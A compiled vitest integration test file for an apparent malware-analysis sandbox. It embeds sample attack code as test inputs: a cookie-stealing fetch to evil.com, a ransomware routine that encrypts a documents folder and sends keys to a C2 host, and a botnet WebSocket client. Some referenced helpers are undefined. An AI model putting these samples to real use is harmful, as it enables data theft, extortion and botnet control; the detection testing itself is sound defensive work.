"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const vitest_1 = require("vitest");
const bridge_1 = require("../../bridge");
const pattern_matcher_bridge_1 = require("../../bridge/pattern-matcher-bridge");
const deobfuscator_bridge_1 = require("../../bridge/deobfuscator-bridge");
// Initialize all WASM modules
function initializeWASMModules() {
    return __awaiter(this, void 0, void 0, function* () {
        yield (0, bridge_1.initializeAnalysisEngine)();
        yield (0, bridge_1.initializeSandbox)();
        // Other modules initialize on first use
    });
}
(0, vitest_1.describe)('Phase 3 Complete Integration Tests', () => {
    (0, vitest_1.beforeAll)(() => __awaiter(void 0, void 0, void 0, function* () {
        // Initialize all WASM modules
        yield initializeWASMModules();
    }), 30000);
    (0, vitest_1.describe)('End-to-End Security Analysis', () => {
        (0, vitest_1.it)('should analyze a malicious JavaScript file with all modules', () => __awaiter(void 0, void 0, void 0, function* () {
            // 1. Create a test malicious JavaScript file
            const maliciousCode = `
        // Obfuscated malware sample
        var _0x4b22=['log','Hello\x20World'];
        (function(_0x2d8f05,_0x4b2211){
          var _0x2d8f=function(_0x4b22){
            while(--_0x4b22){
              _0x2d8f05['push'](_0x2d8f05['shift']());
            }
          };
          _0x2d8f(++_0x4b2211);
        }(_0x4b22,0x1eb));
        var _0x2d8f=function(_0x2d8f05,_0x4b2211){
          _0x2d8f05=_0x2d8f05-0x0;
          var _0x2d8f05=_0x4b22[_0x2d8f05];
          return _0x2d8f05;
        };
        // Suspicious network activity
        fetch('http://evil.com/steal?data=' + document.cookie);
        // Crypto mining
        var miner = new CryptoMiner();
        miner.start();
      `;
            // 2. Process file with file processor
            const fileProcessor = yield (0, bridge_1.createFileProcessor)();
            const fileBuffer = new TextEncoder().encode(maliciousCode).buffer;
            const fileAnalysis = yield fileProcessor.parseFile(fileBuffer, 'javascript');
            (0, vitest_1.expect)(fileAnalysis).toBeDefined();
            const suspiciousPatterns = yield fileProcessor.extractSuspiciousPatterns(maliciousCode);
            (0, vitest_1.expect)(suspiciousPatterns.length).toBeGreaterThan(0);
            // 3. Deobfuscate the code
            const deobfuscated = yield (0, deobfuscator_bridge_1.deobfuscate)(maliciousCode);
            (0, vitest_1.expect)(deobfuscated).toBeDefined();
            (0, vitest_1.expect)(deobfuscated.deobfuscated).toContain('Hello World');
            // 4. Pattern matching for malicious patterns
            const patternMatcher = new PatternMatcherBridge();
            yield patternMatcher.initialize();
            const patterns = yield patternMatcher.scan(new TextEncoder().encode(deobfuscated.deobfuscated).buffer);
            (0, vitest_1.expect)(patterns.success).toBe(true);
            (0, vitest_1.expect)(patterns.data.matches).toContainEqual(vitest_1.expect.objectContaining({
                pattern: vitest_1.expect.stringContaining('cookie'),
                severity: 'high'
            }));
            // 5. Sandbox execution analysis
            yield (0, bridge_1.initializeSandbox)();
            const sandboxResult = yield (0, bridge_1.executeInSandbox)(maliciousCode);
            (0, vitest_1.expect)(sandboxResult.success).toBe(true);
            (0, vitest_1.expect)(sandboxResult.networkAttempts).toBeGreaterThan(0);
            (0, vitest_1.expect)(sandboxResult.suspiciousBehaviors).toContainEqual(vitest_1.expect.stringContaining('network access'));
            // 6. Network traffic analysis (simulated)
            const networkBridge = bridge_1.NetworkBridge.getInstance();
            const networkCapture = {
                packets: [{
                        timestamp: Date.now(),
                        length: 100,
                        sourceIP: '192.168.1.100',
                        destIP: '203.0.113.50', // evil.com
                        protocol: 6,
                        data: new TextEncoder().encode('GET /steal?data=sessionid HTTP/1.1')
                    }],
                startTime: Date.now(),
                endTime: Date.now() + 1000,
                totalPackets: 1,
                totalBytes: 100
            };
            const networkAnalysis = yield networkBridge.analyzeNetworkCapture(networkCapture);
            (0, vitest_1.expect)(networkAnalysis.suspiciousActivities).toBeGreaterThan(0);
            (0, vitest_1.expect)(networkAnalysis.riskScore).toBeGreaterThan(50);
            // 7. Crypto analysis for mining detection
            const cryptoBridge = bridge_1.CryptoBridge.getInstance();
            const hashPattern = yield cryptoBridge.detectCryptoPatterns(new TextEncoder().encode(maliciousCode));
            (0, vitest_1.expect)(hashPattern.includes('mining')).toBe(true);
            // 8. Final analysis engine verdict
            const analysisEngine = yield (0, bridge_1.initializeAnalysisEngine)();
            const finalAnalysis = yield analysisEngine.analyzeCode(maliciousCode, 'javascript');
            (0, vitest_1.expect)(finalAnalysis.success).toBe(true);
            (0, vitest_1.expect)(finalAnalysis.data.riskLevel).toBe('high');
            (0, vitest_1.expect)(finalAnalysis.data.threats).toContain('obfuscation');
            (0, vitest_1.expect)(finalAnalysis.data.threats).toContain('data-exfiltration');
            (0, vitest_1.expect)(finalAnalysis.data.threats).toContain('crypto-mining');
        }));
        (0, vitest_1.it)('should analyze a ransomware sample across all modules', () => __awaiter(void 0, void 0, void 0, function* () {
            const ransomwareCode = `
        // Ransomware simulation
        const crypto = require('crypto');
        const fs = require('fs');
        
        function encryptFile(filepath) {
          const algorithm = 'aes-256-cbc';
          const key = crypto.randomBytes(32);
          const iv = crypto.randomBytes(16);
          
          const input = fs.createReadStream(filepath);
          const output = fs.createWriteStream(filepath + '.encrypted');
          const cipher = crypto.createCipheriv(algorithm, key, iv);
          
          input.pipe(cipher).pipe(output);
          
          // Send key to C2 server
          fetch('https://c2.evil.com/keys', {
            method: 'POST',
            body: JSON.stringify({ key: key.toString('hex'), file: filepath })
          });
        }
        
        // Scan and encrypt all files
        const path = require('path');
        function scanDirectory(dir) {
          fs.readdirSync(dir).forEach(file => {
            const fullPath = path.join(dir, file);
            if (fs.statSync(fullPath).isDirectory()) {
              scanDirectory(fullPath);
            } else {
              encryptFile(fullPath);
            }
          });
        }
        
        scanDirectory('/home/user/documents');
      `;
            // Multi-module analysis
            const fileProcessor = (0, bridge_1.createFileProcessor)();
            const patternMatcher = (0, pattern_matcher_bridge_1.getPatternMatcher)();
            yield patternMatcher.initialize();
            const cryptoBridge = bridge_1.CryptoBridge.getInstance();
            // File analysis
            const fileBuffer = new TextEncoder().encode(ransomwareCode).buffer;
            const fileAnalysis = yield fileProcessor.parseFile(fileBuffer, 'javascript');
            const suspiciousPatterns = yield fileProcessor.extractSuspiciousPatterns(ransomwareCode);
            (0, vitest_1.expect)(suspiciousPatterns.length).toBeGreaterThan(0);
            // Pattern detection
            const patterns = yield patternMatcher.scan(new TextEncoder().encode(ransomwareCode).buffer);
            const ransomwarePatterns = patterns.matches.filter(m => m.rule_id.includes('encrypt') || m.rule_id.includes('ransom'));
            (0, vitest_1.expect)(ransomwarePatterns.length).toBeGreaterThan(0);
            // Crypto analysis - check if code contains crypto operations
            const hasCryptoOps = ransomwareCode.includes('aes-256-cbc') && ransomwareCode.includes('createCipheriv');
            (0, vitest_1.expect)(hasCryptoOps).toBe(true);
            // Final verdict
            const verdict = yield bridge_1.analysisEngine.analyze(new TextEncoder().encode(ransomwareCode), 'ransomware.js', 'javascript');
            (0, vitest_1.expect)(verdict.success).toBe(true);
            (0, vitest_1.expect)(verdict.threatLevel).toBeGreaterThanOrEqual(3);
        }));
        (0, vitest_1.it)('should detect and analyze a botnet C2 communication', () => __awaiter(void 0, void 0, void 0, function* () {
            const c2Code = `
        // Botnet C2 communication
        class BotClient {
          constructor() {
            this.id = this.generateBotId();
            this.c2Server = 'wss://c2.darknet.onion/bot';
            this.heartbeatInterval = 60000; // 1 minute
          }
          
          generateBotId() {
            return 'BOT_' + Math.random().toString(36).substr(2, 9);
          }
          
          async connect() {
            this.ws = new WebSocket(this.c2Server);
            
            this.ws.onopen = () => {
              this.register();
              this.startHeartbeat();
            };
            
            this.ws.onmessage = (event) => {
              const command = JSON.parse(event.data);
              this.executeCommand(command);
            };
          }
          
          register() {
            this.send({
              type: 'register',
              id: this.id,
              os: navigator.platform,
              ip: this.getLocalIP()
            });
          }
          
          startHeartbeat() {
            setInterval(() => {
              this.send({ type: 'heartbeat', id: this.id });
            }, this.heartbeatInterval);
          }
          
          executeCommand(cmd) {
            switch(cmd.type) {
              case 'ddos':
                this.launchDDoS(cmd.target);
                break;
              case 'mine':
                this.startMining(cmd.pool);
                break;
              case 'steal':
                this.stealData(cmd.dataType);
                break;
            }
          }
        }
        
        new BotClient().connect();
      `;
            // Network pattern analysis
            const networkBridge = bridge_1.NetworkBridge.getInstance();
            const patternMatcher = (0, pattern_matcher_bridge_1.getPatternMatcher)();
            // Simulate C2 traffic pattern
            const c2Traffic = [];
            const baseTime = Date.now();
            // Generate beaconing traffic
            for (let i = 0; i < 10; i++) {
                c2Traffic.push({
                    sourceIP: '192.168.1.100',
                    destIP: '185.220.101.1', // Tor exit node
                    sourcePort: 45000 + i,
                    destPort: 443,
                    protocol: 6,
                    timestamp: baseTime + (i * 60000), // Every minute
                    bytesSent: 256,
                    bytesReceived: 512,
                    duration: 1000
                });
            }
            // Convert to proper PacketAnalysis format
            const packets = c2Traffic.map(t => ({
                packet_type: 'TCP',
                source_ip: t.sourceIP,
                dest_ip: t.destIP,
                source_port: t.sourcePort,
                dest_port: t.destPort,
                protocol: 'TCP',
                payload_size: t.bytesSent,
                flags: [],
                timestamp: t.timestamp
            }));
            const trafficPatterns = yield networkBridge.analyzeTrafficPattern(packets);
            (0, vitest_1.expect)(trafficPatterns.length).toBeGreaterThan(0);
            // Check if any pattern indicates beaconing
            const beaconingPattern = trafficPatterns.find(p => p.pattern_type === 'beaconing');
            (0, vitest_1.expect)(beaconingPattern).toBeDefined();
            // Pattern detection
            yield patternMatcher.initialize();
            const patterns = yield patternMatcher.scan(new TextEncoder().encode(c2Code).buffer);
            const c2Patterns = patterns.matches.filter(m => m.severity === 'critical' &&
                (m.rule_id.includes('botnet') || m.rule_id.includes('c2')));
            (0, vitest_1.expect)(c2Patterns.length).toBeGreaterThan(0);
            // Sandbox detection
            yield (0, bridge_1.initializeSandbox)();
            const sandboxResult = yield (0, bridge_1.executeInSandbox)(new TextEncoder().encode(c2Code));
            (0, vitest_1.expect)(sandboxResult.success).toBe(true);
            (0, vitest_1.expect)(sandboxResult.securityEvents.length).toBeGreaterThan(0);
            const wsEvents = sandboxResult.securityEvents.filter(e => e.details && e.details.includes('websocket'));
            (0, vitest_1.expect)(wsEvents.length).toBeGreaterThan(0);
        }));
    });
    (0, vitest_1.describe)('Performance Benchmarks', () => {
        (0, vitest_1.it)('should process large files efficiently', () => __awaiter(void 0, void 0, void 0, function* () {
            const largeFile = 'x'.repeat(1024 * 1024); // 1MB file
            const startTime = Date.now();
            const fileProcessor = getFileProcessor();
            const result = yield fileProcessor.processLargeFile(new TextEncoder().encode(largeFile));
            const processingTime = Date.now() - startTime;
            (0, vitest_1.expect)(result).toBeDefined();
            (0, vitest_1.expect)(processingTime).toBeLessThan(5000); // Should process in under 5 seconds
        }));
        (0, vitest_1.it)('should handle concurrent module operations', () => __awaiter(void 0, void 0, void 0, function* () {
            const operations = [];
            // Launch multiple operations concurrently
            for (let i = 0; i < 10; i++) {
                operations.push(Promise.all([
                    (() => __awaiter(void 0, void 0, void 0, function* () { const fp = (0, bridge_1.createFileProcessor)(); yield fp.initialize(); return fp.parseFile(new TextEncoder().encode(`console.log(${i});`).buffer, 'javascript'); }))(),
                    (() => __awaiter(void 0, void 0, void 0, function* () { const pm = (0, pattern_matcher_bridge_1.getPatternMatcher)(); yield pm.initialize(); return pm.scan(new TextEncoder().encode(`eval("code${i}")`).buffer); }))(),
                    bridge_1.CryptoBridge.getInstance().hash(new TextEncoder().encode(`data${i}`), { algorithm: 'sha256' }),
                    bridge_1.NetworkBridge.getInstance().detectProtocol(new TextEncoder().encode(`HTTP/1.1 ${i}`))
                ]));
            }
            const results = yield Promise.all(operations);
            (0, vitest_1.expect)(results).toHaveLength(10);
            results.forEach((result) => {
                (0, vitest_1.expect)(result).toHaveLength(4);
                result.forEach((r) => (0, vitest_1.expect)(r).toBeTruthy());
            });
        }));
    });
    (0, vitest_1.describe)('Cross-Module Integration', () => {
        (0, vitest_1.it)('should share analysis context between modules', () => __awaiter(void 0, void 0, void 0, function* () {
            const suspiciousCode = `
        // Multi-stage attack
        const stage1 = atob('ZXZhbCgiYWxlcnQoMSkiKQ=='); // eval("alert(1)")
        eval(stage1);
        
        const payload = new Uint8Array([0xde, 0xad, 0xbe, 0xef]);
        crypto.subtle.encrypt(
          { name: "AES-GCM", iv: new Uint8Array(12) },
          key,
          payload
        );
      `;
            // Stage 1: Deobfuscation
            const deobResult = yield (0, deobfuscator_bridge_1.deobfuscate)(suspiciousCode);
            (0, vitest_1.expect)(deobResult.deobfuscated).toContain('eval("alert(1)")');
            // Stage 2: Pattern matching on deobfuscated code
            const patternMatcher = (0, pattern_matcher_bridge_1.getPatternMatcher)();
            yield patternMatcher.initialize();
            const patterns = yield patternMatcher.scan(new TextEncoder().encode(deobResult.deobfuscated).buffer);
            (0, vitest_1.expect)(patterns.matches).toBeDefined();
            const evalPatterns = patterns.matches.filter(m => m.rule_id.includes('eval') && m.severity === 'high');
            (0, vitest_1.expect)(evalPatterns.length).toBeGreaterThan(0);
            // Stage 3: Crypto analysis
            const cryptoBridge = bridge_1.CryptoBridge.getInstance();
            const hasAesGcm = deobResult.deobfuscated.includes('AES-GCM');
            (0, vitest_1.expect)(hasAesGcm).toBe(true);
            // Stage 4: Final analysis combining all findings
            const finalAnalysis = yield bridge_1.analysisEngine.analyze(new TextEncoder().encode(suspiciousCode), 'suspicious.js', 'javascript');
            (0, vitest_1.expect)(finalAnalysis.threats.length).toBeGreaterThan(0);
            (0, vitest_1.expect)(finalAnalysis.threatLevel).toBeGreaterThanOrEqual(3);
        }));
    });
    (0, vitest_1.describe)('Security Hardening Verification', () => {
        (0, vitest_1.it)('should handle malformed inputs safely', () => __awaiter(void 0, void 0, void 0, function* () {
            const malformedInputs = [
                null,
                undefined,
                '',
                'a'.repeat(10 * 1024 * 1024), // 10MB string
                new Uint8Array(0),
                new Uint8Array([0xff, 0xfe]), // Invalid UTF-8
            ];
            for (const input of malformedInputs) {
                // All modules should handle invalid inputs gracefully
                try {
                    if (typeof input === 'string' && input) {
                        const fp = (0, bridge_1.createFileProcessor)();
                        yield fp.initialize();
                        yield fp.parseFile(new TextEncoder().encode(input).buffer, 'text');
                    }
                    else if (input instanceof Uint8Array && input.length > 0) {
                        yield bridge_1.CryptoBridge.getInstance().hash(input, { algorithm: 'sha256' });
                    }
                }
                catch (error) {
                    // Expected for invalid inputs
                }
            }
        }));
        (0, vitest_1.it)('should enforce resource limits', () => __awaiter(void 0, void 0, void 0, function* () {
            // Test sandbox resource limits
            const infiniteLoop = `while(true) { console.log('loop'); }`;
            const result = yield (0, bridge_1.executeInSandbox)(new TextEncoder().encode(infiniteLoop));
            (0, vitest_1.expect)(result.success).toBe(true);
            (0, vitest_1.expect)(result.exitCode).not.toBe(0); // Should timeout
            (0, vitest_1.expect)(result.executionTime).toBeLessThan(6000); // 5s limit + margin
        }));
        (0, vitest_1.it)('should use secure random generation', () => __awaiter(void 0, void 0, void 0, function* () {
            const cryptoBridge = bridge_1.CryptoBridge.getInstance();
            // Generate multiple random values
            const randoms = [];
            for (let i = 0; i < 100; i++) {
                const key = cryptoBridge.generateAESKey(256);
                randoms.push(key);
            }
            // Check for uniqueness (no collisions)
            const uniqueKeys = new Set(randoms.map(k => k.toString()));
            (0, vitest_1.expect)(uniqueKeys.size).toBe(100);
            // Check entropy (simplified)
            const firstBytes = randoms.map(k => k[0]);
            const uniqueFirstBytes = new Set(firstBytes);
            (0, vitest_1.expect)(uniqueFirstBytes.size).toBeGreaterThan(50); // Good distribution
        }));
    });
});
(0, vitest_1.describe)('Phase 3 Module Status', () => {
    (0, vitest_1.it)('should verify all 7 WASM modules are functional', () => __awaiter(void 0, void 0, void 0, function* () {
        const modules = [
            { name: 'Analysis Engine', test: () => bridge_1.analysisEngine },
            { name: 'File Processor', test: () => (0, bridge_1.createFileProcessor)() },
            { name: 'Pattern Matcher', test: () => (0, pattern_matcher_bridge_1.getPatternMatcher)() },
            { name: 'Deobfuscator', test: () => __awaiter(void 0, void 0, void 0, function* () { yield (0, deobfuscator_bridge_1.deobfuscate)('test'); return true; }) },
            { name: 'Sandbox', test: () => __awaiter(void 0, void 0, void 0, function* () { yield (0, bridge_1.initializeSandbox)(); return true; }) },
            { name: 'Crypto', test: () => bridge_1.CryptoBridge.getInstance() },
            { name: 'Network', test: () => bridge_1.NetworkBridge.getInstance() }
        ];
        for (const module of modules) {
            try {
                const instance = yield module.test();
                (0, vitest_1.expect)(instance).toBeTruthy();
                console.log(`✅ ${module.name}: Operational`);
            }
            catch (error) {
                console.error(`❌ ${module.name}: Failed - ${error}`);
                throw error;
            }
        }
        console.log('\n🎉 All 7 WASM modules are operational!');
        console.log('📊 Phase 3 Security Sandbox Implementation: COMPLETE');
    }));
});
